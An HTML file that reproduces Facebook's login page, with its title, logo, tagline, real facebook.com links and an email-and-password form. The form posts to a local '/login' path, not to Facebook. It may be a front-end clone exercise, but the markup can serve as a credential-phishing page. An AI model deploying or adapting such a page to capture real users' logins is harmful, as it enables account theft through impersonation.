<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook - log in or sign up</title>
  <link rel="icon" href="fb.png" type="image/x-icon" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <main>
    <section class="container">
      <img src="fb.svg" id="fbimg" alt="Facebook logo" />
      <p class="subtext">Facebook helps you connect and <br> share with the people in your life.</p>

      <div class="card">
        <form action="/login" method="POST">
          <input
            type="email"
            name="email"
            id="email"
            placeholder="Email address or phone number"
            required
          />
          <input
            type="password"
            name="password"
            id="password"
            placeholder="Password"
            required
          />

          <button id="login" type="submit">Log in</button>

          <a
            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
            aria-label="Recover your Facebook password"
          >
            Forgotten password?
          </a>

          <hr>

          <button id="CNA" type="button">Create new account</button>
        </form>
      </div>

      <p class="last">
        <a class="cap"
          href="https://www.facebook.com/pages/create/?ref_type=registration_form"
        >
         <strong>create a Page</strong>
        </a>
        for a celebrity, brand or business.
      </p>
    </section>
  </main>
</body>
</html>
